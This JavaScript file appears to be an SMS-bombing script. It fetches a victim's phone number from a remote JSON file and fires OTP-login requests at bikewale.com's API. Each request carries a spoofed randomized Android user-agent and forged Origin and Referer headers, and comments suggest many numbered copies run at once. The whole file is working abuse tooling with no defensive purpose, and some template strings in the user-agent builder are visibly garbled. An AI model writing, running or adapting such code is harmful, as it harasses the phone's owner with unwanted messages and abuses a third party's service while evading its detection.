const NUMBER_JSON_URL = 'https://quickmovies.github.io/api/number.json';
const OTP_API_URL = 'https://www.bikewale.com/api/user/login/otp-request/';

// =============== Realistic Random Device Generator ===============
function getRandomDevice() {
  const devices = [
    { model: 'Infinix X6871', android: '15', chrome: '131' },
    { model: 'Samsung Galaxy S24', android: '15', chrome: '130' },
    { model: 'Redmi Note 13 Pro', android: '14', chrome: '129' },
    { model: 'POCO X6 Pro', android: '14', chrome: '131' },
    { model: 'Realme GT 6', android: '15', chrome: '130' },
    { model: 'Vivo V30', android: '14', chrome: '128' },
    { model: 'OnePlus Nord 4', android: '15', chrome: '131' },
    { model: 'Motorola Edge 50', android: '14', chrome: '129' },
    { model: 'iQOO Z9', android: '14', chrome: '130' },
    { model: 'Nothing Phone 2a', android: '15', chrome: '131' },
    { model: 'Samsung Galaxy A55', android: '14', chrome: '128' },
    { model: 'Xiaomi 14', android: '15', chrome: '130' },
    { model: 'Oppo Reno 12', android: '14', chrome: '129' },
    { model: 'Tecno Camon 30', android: '14', chrome: '131' },
    { model: 'Infinix Note 40', android: '14', chrome: '130' }
  ];

  const d = devices[Math.floor(Math.random() * devices.length)];
  const build = 'AP3A.' + (240000 + Math.floor(Math.random() * 9000)) + '.015.A2';

  const ua = `Mozilla/5.0 (Linux; Android ${d.android}; \( {d.model} Build/ \){build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${d.chrome}.0.0.0 Mobile Safari/537.36`;

  const secChUa = `"Android WebView";v="\( {d.chrome}", "Chromium";v=" \){d.chrome}", "Not(A:Brand";v="24"`;

  return {
    userAgent: ua,
    secChUa: secChUa,
    platform: '"Android"',
    mobile: '?1'
  };
}
// ================================================================

(async function () {
  // Change this for each file: v1.js, v2.js, v3.js ...
  const RESULT_KEY = '__result_v1.js';

  const device = getRandomDevice();

  try {
    // 1. Get number
    const res = await fetch(NUMBER_JSON_URL + '?t=' + Date.now());
    const data = await res.json();

    let numbers = [];
    if (Array.isArray(data)) {
      numbers = data.map(item => {
        if (typeof item === 'object' && item !== null) return item.number ?? item;
        return item;
      });
    }

    if (numbers.length === 0) {
      window[RESULT_KEY] = { success: false, message: 'No number found' };
      window.__lastResult = window[RESULT_KEY];
      return;
    }

    const number = String(numbers[0]).trim();

    if (!/^\d{10}$/.test(number)) {
      window[RESULT_KEY] = { success: false, message: 'Invalid number: ' + number };
      window.__lastResult = window[RESULT_KEY];
      return;
    }

    // 2. Send OTP with random realistic device
    const payload = {
      mobileNo: number,
      sourceModule: 14
    };

    const otpRes = await fetch(OTP_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json;charset=UTF-8',
        'Accept': '*/*',
        'Origin': 'https://www.bikewale.com',
        'Referer': 'https://www.bikewale.com/',
        'User-Agent': device.userAgent,
        'sec-ch-ua': device.secChUa,
        'sec-ch-ua-platform': device.platform,
        'sec-ch-ua-mobile': device.mobile,
        'x-requested-with': 'mark.via.gp',
        'serverdomain': 'CarWale'
      },
      body: JSON.stringify(payload)
    });

    const text = await otpRes.text();
    let result;
    try {
      result = JSON.parse(text);
    } catch {
      result = { raw: text };
    }

    if (otpRes.ok) {
      window[RESULT_KEY] = {
        success: true,
        message: `OTP sent to ${number}`,
        data: result
      };
    } else {
      window[RESULT_KEY] = {
        success: false,
        message: `HTTP ${otpRes.status}`,
        data: result
      };
    }

    window.__lastResult = window[RESULT_KEY];

  } catch (err) {
    window[RESULT_KEY] = {
      success: false,
      message: err.message
    };
    window.__lastResult = window[RESULT_KEY];
  }
})();
